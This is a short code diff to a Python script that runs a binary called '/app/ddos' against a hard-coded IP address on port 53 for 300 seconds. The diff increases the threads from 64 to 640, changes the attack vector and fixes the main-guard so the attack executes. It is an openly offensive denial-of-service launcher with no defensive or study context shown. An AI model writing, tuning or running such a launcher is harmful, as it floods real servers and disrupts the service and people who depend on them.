@@ -8,8 +8,8 @@ BINARY = "/app/ddos"
 TARGET_IP = "147.75.202.61"
 TARGET_PORT = "53"
 DURATION = "300"
-THREADS = "64"
-VECTOR = "5"
+THREADS = "640"
+VECTOR = "2"
 
 def attack():
     # Make binary executable
@@ -30,5 +30,5 @@ def attack():
     # Execute attack (foreground - output visible)
     subprocess.run(cmd)
 
-if name == "main":
+if __name__ == "__main__":
     attack()
